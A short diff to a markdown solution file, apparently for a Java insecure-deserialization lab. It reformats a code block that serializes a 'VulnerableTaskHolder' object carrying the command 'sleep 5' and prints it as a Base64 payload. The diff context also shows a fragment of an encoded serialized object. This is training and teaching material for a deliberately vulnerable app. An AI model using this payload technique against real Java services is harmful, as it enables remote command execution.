@@ -954,14 +954,16 @@ rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAA
 
 Code to generate payload; you can run this method as a test.
 
-`	public void createPayload() throws Exception {`
-		`VulnerableTaskHolder o = new VulnerableTaskHolder("namenotimportant", "sleep 5");`
-		`ByteArrayOutputStream baos = new ByteArrayOutputStream();`
-		`ObjectOutputStream oos = new ObjectOutputStream(baos);`
-		`oos.writeObject(o);`
-		`oos.close();`
-		`System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));`
-	`}`
+```java
+public void createPayload() throws Exception {
+		VulnerableTaskHolder o = new VulnerableTaskHolder("namenotimportant", "sleep 5");
+		ByteArrayOutputStream baos = new ByteArrayOutputStream();
+		ObjectOutputStream oos = new ObjectOutputStream(baos);
+		oos.writeObject(o);
+		oos.close();
+		System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
+}
+```
 
 Please note that this was only verified on a Windows machine and the Linux payload has been generated blindly.
 
